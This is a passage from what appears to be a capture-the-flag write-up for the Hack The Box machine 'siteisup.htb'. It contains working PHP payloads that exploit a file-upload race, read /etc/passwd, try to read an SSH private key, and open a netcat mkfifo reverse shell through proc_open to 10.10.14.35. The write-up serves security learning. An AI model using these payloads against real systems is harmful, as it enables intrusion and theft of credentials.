+        <span class="nv">$now</span> <span class="o">=</span> <span class="nb">time</span><span class="p">();</span>
+        <span class="k">echo</span> <span class="s2">&quot;epoch: &quot;</span><span class="o">.</span><span class="nv">$now</span><span class="o">.</span><span class="s2">&quot; - path: &quot;</span><span class="o">.</span><span class="s2">&quot;http://dev.siteisup.htb/uploads/&quot;</span><span class="o">.</span><span class="nb">md5</span><span class="p">(</span><span class="nv">$now</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;/do_thing.phar&quot;</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
+        <span class="nb">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+<span class="p">}</span>
+<span class="cp">?&gt;</span>
+</pre></div>
+</div>
+<p>This didn’t work, and that’s because I got impatient and didn’t realise that the file is getting deleted as soon as it’s done iterating through the addresses, since our script has just a few lines, it gets deleted before we even try to hit the uploaded file.</p>
+<div class="highlight-php notranslate"><div class="highlight"><pre><span></span><span class="x">  # Delete the uploaded file.</span>
+<span class="x">        @unlink($final_path);</span>
+</pre></div>
+</div>
+<p>So maybe we can still give an actual list of addresses to iterate through before the script, a long one, so that we have time to use the LFI, or alternatively we can play elevator music to the server, ask him to please be patient and listen to vivaldi, while we contact a supervisor, but really we’re not, we’re trigering an LFI instead.</p>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">http.server</span> <span class="kn">import</span> <span class="n">BaseHTTPRequestHandler</span><span class="p">,</span><span class="n">HTTPServer</span>
+<span class="kn">from</span> <span class="nn">time</span> <span class="kn">import</span> <span class="n">sleep</span>
+
+<span class="k">class</span> <span class="nc">myHandler</span><span class="p">(</span><span class="n">BaseHTTPRequestHandler</span><span class="p">):</span>
+    <span class="k">def</span> <span class="nf">do_GET</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="k">if</span> <span class="bp">self</span><span class="o">.</span><span class="n">path</span> <span class="o">==</span> <span class="s1">&#39;/elevator&#39;</span><span class="p">:</span>
+            <span class="c1"># Play vivaldi for a long minute</span>
+            <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;https://youtu.be/GRxofEmo3HA&quot;</span><span class="p">)</span>
+            <span class="n">sleep</span><span class="p">(</span><span class="mi">60</span><span class="p">)</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">send_response</span><span class="p">(</span><span class="mi">200</span><span class="p">)</span>
+
+<span class="n">server</span> <span class="o">=</span> <span class="n">HTTPServer</span><span class="p">((</span><span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="mi">8000</span><span class="p">),</span> <span class="n">myHandler</span><span class="p">)</span>
+<span class="n">server</span><span class="o">.</span><span class="n">serve_forever</span><span class="p">()</span>
+</pre></div>
+</div>
+<p><code class="docutils literal notranslate"><span class="pre">do_thing.phar</span></code></p>
+<div class="highlight-php notranslate"><div class="highlight"><pre><span></span><span class="x">http://10.10.14.35:8000/elevator</span>
+<span class="cp">&lt;?php</span>
+<span class="nb">phpinfo</span><span class="p">()</span>
+<span class="cp">?&gt;</span>
+</pre></div>
+</div>
+<p><code class="docutils literal notranslate"><span class="pre">truely_random.php</span></code></p>
+<div class="highlight-php notranslate"><div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
+<span class="k">while</span><span class="p">(</span><span class="k">true</span><span class="p">){</span>
+        <span class="nv">$now</span> <span class="o">=</span> <span class="nb">time</span><span class="p">();</span>
+        <span class="k">echo</span> <span class="s2">&quot;epoch: &quot;</span><span class="o">.</span><span class="nv">$now</span><span class="o">.</span><span class="s2">&quot; - path: &quot;</span><span class="o">.</span><span class="s2">&quot;http://dev.siteisup.htb/uploads/&quot;</span><span class="o">.</span><span class="nb">md5</span><span class="p">(</span><span class="nv">$now</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;/do_thing.phar&quot;</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
+        <span class="nb">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+<span class="p">}</span>
+<span class="cp">?&gt;</span>
+</pre></div>
+</div>
+<p>So I know that the original idea was to use the admin page, but it won’t work, as it would need to end in .php, doesn’t matter, in fact we can just trigger it directly.</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>php<span class="w"> </span>-f<span class="w"> </span>truely_random.phar
+epoch:<span class="w"> </span><span class="m">1667073507</span><span class="w"> </span>-<span class="w"> </span>path:<span class="w"> </span>http://dev.siteisup.htb/uploads/85a641c8505df5499904db2d1d5832d1/do_thing.phar
+epoch:<span class="w"> </span><span class="m">1667073508</span><span class="w"> </span>-<span class="w"> </span>path:<span class="w"> </span>http://dev.siteisup.htb/uploads/8265a2da8eff27a6a1ce3794cd0dc015/do_thing.phar
+epoch:<span class="w"> </span><span class="m">1667073509</span><span class="w"> </span>-<span class="w"> </span>path:<span class="w"> </span>http://dev.siteisup.htb/uploads/fb364b84dbebe871d9e5ff2a9cfe8399/do_thing.phar
+epoch:<span class="w"> </span><span class="m">1667073510</span><span class="w"> </span>-<span class="w"> </span>path:<span class="w"> </span>http://dev.siteisup.htb/uploads/c9fcf577d1f013918e2bebf94780b267/do_thing.phar
+^C
+</pre></div>
+</div>
+<p>clicking those paths and this works, as until the server stops listening to vivaldi, it actually times out on the server side before we send 200 but hey … it did the job<br />
+<img alt="phpinfo.png" src="../../../../_images/phpinfo.png" /></p>
+</section>
+<section id="exploring-system-files-with-the-rce">
+<h2>Exploring system files with the RCE<a class="headerlink" href="#exploring-system-files-with-the-rce" title="Permalink to this heading">#</a></h2>
+<p>A quick look at the disabled functions and we know we’re probably not gonna be able to do a reverse shell directly, but we know we can use <code class="docutils literal notranslate"><span class="pre">file_get_contents()</span></code> as we saw it used in checker.php, maybe we can use that read some files on the box instead?<br />
+<img alt="disabled.png" src="../../../../_images/disabled.png" /></p>
+<div class="highlight-php notranslate"><div class="highlight"><pre><span></span><span class="x">http://10.10.14.35:8000/elevator</span>
+<span class="cp">&lt;?php</span>
+<span class="nv">$file</span> <span class="o">=</span> <span class="nb">file_get_contents</span><span class="p">(</span><span class="s2">&quot;/etc/passwd&quot;</span><span class="p">);</span>
+<span class="nv">$file</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span> <span class="nv">$file</span><span class="p">);</span>
+<span class="nv">$file</span> <span class="o">=</span> <span class="nb">implode</span><span class="p">(</span><span class="s2">&quot;&lt;br&gt;&quot;</span><span class="p">,</span> <span class="nv">$file</span><span class="p">);</span>
+<span class="k">echo</span> <span class="nv">$file</span><span class="p">;</span>
+<span class="cp">?&gt;</span>
+</pre></div>
+</div>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.10.14.35</span><span class="p">:</span><span class="mi">8000</span><span class="o">/</span><span class="n">elevator</span> <span class="n">root</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="n">root</span><span class="p">:</span><span class="o">/</span><span class="n">root</span><span class="p">:</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">bash</span>
+<span class="n">daemon</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">1</span><span class="p">:</span><span class="mi">1</span><span class="p">:</span><span class="n">daemon</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+<span class="nb">bin</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">2</span><span class="p">:</span><span class="mi">2</span><span class="p">:</span><span class="nb">bin</span><span class="p">:</span><span class="o">/</span><span class="nb">bin</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+<span class="n">sys</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">3</span><span class="p">:</span><span class="mi">3</span><span class="p">:</span><span class="n">sys</span><span class="p">:</span><span class="o">/</span><span class="n">dev</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+<span class="n">sync</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">4</span><span class="p">:</span><span class="mi">65534</span><span class="p">:</span><span class="n">sync</span><span class="p">:</span><span class="o">/</span><span class="nb">bin</span><span class="p">:</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">sync</span>
+<span class="n">games</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">5</span><span class="p">:</span><span class="mi">60</span><span class="p">:</span><span class="n">games</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">games</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+<span class="n">man</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">6</span><span class="p">:</span><span class="mi">12</span><span class="p">:</span><span class="n">man</span><span class="p">:</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">cache</span><span class="o">/</span><span class="n">man</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+<span class="n">lp</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">7</span><span class="p">:</span><span class="mi">7</span><span class="p">:</span><span class="n">lp</span><span class="p">:</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">spool</span><span class="o">/</span><span class="n">lpd</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+<span class="n">mail</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">8</span><span class="p">:</span><span class="mi">8</span><span class="p">:</span><span class="n">mail</span><span class="p">:</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">mail</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+<span class="n">news</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">9</span><span class="p">:</span><span class="mi">9</span><span class="p">:</span><span class="n">news</span><span class="p">:</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">spool</span><span class="o">/</span><span class="n">news</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+<span class="n">uucp</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">10</span><span class="p">:</span><span class="mi">10</span><span class="p">:</span><span class="n">uucp</span><span class="p">:</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">spool</span><span class="o">/</span><span class="n">uucp</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+<span class="n">proxy</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">13</span><span class="p">:</span><span class="mi">13</span><span class="p">:</span><span class="n">proxy</span><span class="p">:</span><span class="o">/</span><span class="nb">bin</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+<span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">33</span><span class="p">:</span><span class="mi">33</span><span class="p">:</span><span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="p">:</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">www</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+<span class="n">backup</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">34</span><span class="p">:</span><span class="mi">34</span><span class="p">:</span><span class="n">backup</span><span class="p">:</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">backups</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+<span class="nb">list</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">38</span><span class="p">:</span><span class="mi">38</span><span class="p">:</span><span class="n">Mailing</span> <span class="n">List</span> <span class="n">Manager</span><span class="p">:</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="nb">list</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+<span class="n">irc</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">39</span><span class="p">:</span><span class="mi">39</span><span class="p">:</span><span class="n">ircd</span><span class="p">:</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">run</span><span class="o">/</span><span class="n">ircd</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+<span class="n">gnats</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">41</span><span class="p">:</span><span class="mi">41</span><span class="p">:</span><span class="n">Gnats</span> <span class="n">Bug</span><span class="o">-</span><span class="n">Reporting</span> <span class="n">System</span> <span class="p">(</span><span class="n">admin</span><span class="p">):</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">gnats</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+<span class="n">nobody</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">65534</span><span class="p">:</span><span class="mi">65534</span><span class="p">:</span><span class="n">nobody</span><span class="p">:</span><span class="o">/</span><span class="n">nonexistent</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+<span class="n">systemd</span><span class="o">-</span><span class="n">network</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">100</span><span class="p">:</span><span class="mi">102</span><span class="p">:</span><span class="n">systemd</span> <span class="n">Network</span> <span class="n">Management</span><span class="p">,,,:</span><span class="o">/</span><span class="n">run</span><span class="o">/</span><span class="n">systemd</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+<span class="n">systemd</span><span class="o">-</span><span class="n">resolve</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">101</span><span class="p">:</span><span class="mi">103</span><span class="p">:</span><span class="n">systemd</span> <span class="n">Resolver</span><span class="p">,,,:</span><span class="o">/</span><span class="n">run</span><span class="o">/</span><span class="n">systemd</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+<span class="n">systemd</span><span class="o">-</span><span class="n">timesync</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">102</span><span class="p">:</span><span class="mi">104</span><span class="p">:</span><span class="n">systemd</span> <span class="n">Time</span> <span class="n">Synchronization</span><span class="p">,,,:</span><span class="o">/</span><span class="n">run</span><span class="o">/</span><span class="n">systemd</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+<span class="n">messagebus</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">103</span><span class="p">:</span><span class="mi">106</span><span class="p">::</span><span class="o">/</span><span class="n">nonexistent</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+<span class="n">syslog</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">104</span><span class="p">:</span><span class="mi">110</span><span class="p">::</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">syslog</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+<span class="n">_apt</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">105</span><span class="p">:</span><span class="mi">65534</span><span class="p">::</span><span class="o">/</span><span class="n">nonexistent</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+<span class="n">tss</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">106</span><span class="p">:</span><span class="mi">111</span><span class="p">:</span><span class="n">TPM</span> <span class="n">software</span> <span class="n">stack</span><span class="p">,,,:</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">tpm</span><span class="p">:</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">false</span>
+<span class="n">uuidd</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">107</span><span class="p">:</span><span class="mi">112</span><span class="p">::</span><span class="o">/</span><span class="n">run</span><span class="o">/</span><span class="n">uuidd</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+<span class="n">tcpdump</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">108</span><span class="p">:</span><span class="mi">113</span><span class="p">::</span><span class="o">/</span><span class="n">nonexistent</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+<span class="n">sshd</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">109</span><span class="p">:</span><span class="mi">65534</span><span class="p">::</span><span class="o">/</span><span class="n">run</span><span class="o">/</span><span class="n">sshd</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+<span class="n">landscape</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">110</span><span class="p">:</span><span class="mi">115</span><span class="p">::</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">landscape</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+<span class="n">pollinate</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">111</span><span class="p">:</span><span class="mi">1</span><span class="p">::</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">cache</span><span class="o">/</span><span class="n">pollinate</span><span class="p">:</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">false</span>
+<span class="n">systemd</span><span class="o">-</span><span class="n">coredump</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">999</span><span class="p">:</span><span class="mi">999</span><span class="p">:</span><span class="n">systemd</span> <span class="n">Core</span> <span class="n">Dumper</span><span class="p">:</span><span class="o">/</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+<span class="n">lxd</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">998</span><span class="p">:</span><span class="mi">100</span><span class="p">::</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">snap</span><span class="o">/</span><span class="n">lxd</span><span class="o">/</span><span class="n">common</span><span class="o">/</span><span class="n">lxd</span><span class="p">:</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">false</span>
+<span class="n">developer</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">1002</span><span class="p">:</span><span class="mi">1002</span><span class="p">::</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">developer</span><span class="p">:</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">bash</span>
+</pre></div>
+</div>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>grep<span class="w"> </span>sh$<span class="w"> </span>passwd
+root:x:0:0:root:/root:/bin/bash
+developer:x:1002:1002::/home/developer:/bin/bash
+</pre></div>
+</div>
+<p>There’s a developer user, can we get the private key?</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>http://10.10.14.35:8000/elevator
+&lt;?php
+<span class="nv">$file</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>file_get_contents<span class="o">(</span><span class="s2">&quot;/home/developer/.ssh/id_rsa&quot;</span><span class="o">)</span><span class="p">;</span>
+<span class="nv">$file</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>explode<span class="o">(</span><span class="s2">&quot;\n&quot;</span>,<span class="w"> </span><span class="nv">$file</span><span class="o">)</span><span class="p">;</span>
+<span class="nv">$file</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>implode<span class="o">(</span><span class="s2">&quot;&lt;br&gt;&quot;</span>,<span class="w"> </span><span class="nv">$file</span><span class="o">)</span><span class="p">;</span>
+<span class="nb">echo</span><span class="w"> </span><span class="nv">$file</span><span class="p">;</span>
+?&gt;
+</pre></div>
+</div>
+<p>no we can’t, this is apache so we’re probably running as www-data, trying to think of other files we could try to look at, maybe the apache vhost config file in case there’s another vhost? There doesn’t seem to be a database as far as we can see, so that would be a shot in the dark, I’m sure there are things we could think of pulling off the box but it’s probably not the right track, lets circle back to what exactly is disabled or not on the php server, and see if we can push this RCE a step further and get a reverse shell.</p>
+</section>
+<section id="further-enumeraton-of-the-php-server">
+<h2>Further enumeraton of the PHP Server<a class="headerlink" href="#further-enumeraton-of-the-php-server" title="Permalink to this heading">#</a></h2>
+<p><img alt="disabled.png" src="../../../../_images/disabled.png" /></p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nb">printf</span><span class="w"> </span><span class="s1">&#39;pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,pcntl_unshare,error_log,system,exec,shell_exec,popen,passthru,link,symlink,syslog,ld,mail,stream_socket_sendto,dl,stream_socket_client,fsockopen&#39;</span><span class="p">|</span>tr<span class="w"> </span><span class="s2">&quot;,&quot;</span><span class="w"> </span><span class="s2">&quot;\n&quot;</span>
+pcntl_alarm
+pcntl_fork
+pcntl_waitpid
+pcntl_wait
+pcntl_wifexited
+pcntl_wifstopped
+pcntl_wifsignaled
+pcntl_wifcontinued
+pcntl_wexitstatus
+pcntl_wtermsig
+pcntl_wstopsig
+pcntl_signal
+pcntl_signal_get_handler
+pcntl_signal_dispatch
+pcntl_get_last_error
+pcntl_strerror
+pcntl_sigprocmask
+pcntl_sigwaitinfo
+pcntl_sigtimedwait
+pcntl_exec
+pcntl_getpriority
+pcntl_setpriority
+pcntl_async_signals
+pcntl_unshare
+error_log
+system
+<span class="nb">exec</span>
+shell_exec
+popen
+passthru
+link
+symlink
+syslog
+ld
+mail
+stream_socket_sendto
+dl
+stream_socket_client
+fsockopen
+</pre></div>
+</div>
+<p>So <code class="docutils literal notranslate"><span class="pre">system</span></code> <code class="docutils literal notranslate"><span class="pre">exec</span></code> <code class="docutils literal notranslate"><span class="pre">shell_exec</span></code> <code class="docutils literal notranslate"><span class="pre">popen</span></code> <code class="docutils literal notranslate"><span class="pre">passthru</span></code> <code class="docutils literal notranslate"><span class="pre">fsockopen</span></code> are disabled, now when looking at revshells.com, there is also <code class="docutils literal notranslate"><span class="pre">proc_open</span></code> that we could use, and it’s not disabled, but the one on revshells.com also uses fsockopen, and that’s disabled, but at least we have a something that we can work with.</p>
+</section>
+<section id="php-reverse-shell-with-proc-open-only">
+<h2>PHP reverse shell with proc-open only<a class="headerlink" href="#php-reverse-shell-with-proc-open-only" title="Permalink to this heading">#</a></h2>
+<p><a class="reference external" href="https://www.php.net/manual/en/function.proc-open.php">https://www.php.net/manual/en/function.proc-open.php</a></p>
+<p>Looking at the php manual for <code class="docutils literal notranslate"><span class="pre">proc_open</span></code> I managed to get command execution by adapting the first example from the docs:</p>
+<div class="highlight-php notranslate"><div class="highlight"><pre><span></span><span class="x">http://10.10.14.35:8000/elevator</span>
+<span class="cp">&lt;?php</span>
+
+<span class="nv">$cmd</span> <span class="o">=</span> <span class="s1">&#39;id&#39;</span><span class="p">;</span>
+
+<span class="nv">$descriptorspec</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
+   <span class="mi">0</span> <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span><span class="s2">&quot;pipe&quot;</span><span class="p">,</span> <span class="s2">&quot;r&quot;</span><span class="p">),</span>
+   <span class="mi">1</span> <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span><span class="s2">&quot;pipe&quot;</span><span class="p">,</span> <span class="s2">&quot;w&quot;</span><span class="p">),</span>
+   <span class="mi">2</span> <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span><span class="s2">&quot;file&quot;</span><span class="p">,</span> <span class="s2">&quot;/dev/null&quot;</span><span class="p">,</span> <span class="s2">&quot;a&quot;</span><span class="p">)</span>
+<span class="p">);</span>
+
+<span class="nv">$process</span> <span class="o">=</span> <span class="nb">proc_open</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">,</span> <span class="nv">$descriptorspec</span><span class="p">,</span> <span class="nv">$pipes</span><span class="p">);</span>
+
+<span class="k">if</span> <span class="p">(</span><span class="nb">is_resource</span><span class="p">(</span><span class="nv">$process</span><span class="p">))</span> <span class="p">{</span>
+    <span class="nb">fclose</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
+    <span class="k">echo</span> <span class="nb">stream_get_contents</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
+    <span class="nb">fclose</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
+    <span class="nv">$return_value</span> <span class="o">=</span> <span class="nb">proc_close</span><span class="p">(</span><span class="nv">$process</span><span class="p">);</span>
+    <span class="k">echo</span> <span class="s2">&quot;command returned </span><span class="si">$return_value</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="cp">?&gt;</span>
+</pre></div>
+</div>
+<p>After a bit of trial and error, I could turn that into a working reverse shell,</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>http://10.10.14.35:8000/elevator
+&lt;?php
+
+<span class="nv">$cmd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2&gt;&amp;1|nc 10.10.14.35 4242 &gt;/tmp/f&#39;</span><span class="p">;</span>
+
+<span class="nv">$descriptorspec</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>array<span class="o">(</span>
+<span class="w">   </span><span class="nv">0</span><span class="w"> </span><span class="o">=</span>&gt;<span class="w"> </span>array<span class="o">(</span><span class="s2">&quot;pipe&quot;</span>,<span class="w"> </span><span class="s2">&quot;r&quot;</span><span class="o">)</span>,
+<span class="w">   </span><span class="nv">1</span><span class="w"> </span><span class="o">=</span>&gt;<span class="w"> </span>array<span class="o">(</span><span class="s2">&quot;pipe&quot;</span>,<span class="w"> </span><span class="s2">&quot;w&quot;</span><span class="o">)</span>,
+<span class="w">   </span><span class="nv">2</span><span class="w"> </span><span class="o">=</span>&gt;<span class="w"> </span>array<span class="o">(</span><span class="s2">&quot;file&quot;</span>,<span class="w"> </span><span class="s2">&quot;/dev/null&quot;</span>,<span class="w"> </span><span class="s2">&quot;a&quot;</span><span class="o">)</span>
+<span class="o">)</span><span class="p">;</span>
+
+<span class="nv">$process</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>proc_open<span class="o">(</span><span class="nv">$cmd</span>,<span class="w"> </span><span class="nv">$descriptorspec</span>,<span class="w"> </span><span class="nv">$pipes</span><span class="o">)</span><span class="p">;</span>
+
+<span class="k">if</span><span class="w"> </span><span class="o">(</span>is_resource<span class="o">(</span><span class="nv">$process</span><span class="o">))</span><span class="w"> </span><span class="o">{</span>
+<span class="w">    </span>fclose<span class="o">(</span><span class="nv">$pipes</span><span class="o">[</span><span class="m">0</span><span class="o">])</span><span class="p">;</span>
+<span class="w">    </span><span class="nb">echo</span><span class="w"> </span>stream_get_contents<span class="o">(</span><span class="nv">$pipes</span><span class="o">[</span><span class="m">1</span><span class="o">])</span><span class="p">;</span>
+<span class="w">    </span>fclose<span class="o">(</span><span class="nv">$pipes</span><span class="o">[</span><span class="m">1</span><span class="o">])</span><span class="p">;</span>
+<span class="w">    </span><span class="nv">$return_value</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>proc_close<span class="o">(</span><span class="nv">$process</span><span class="o">)</span><span class="p">;</span>
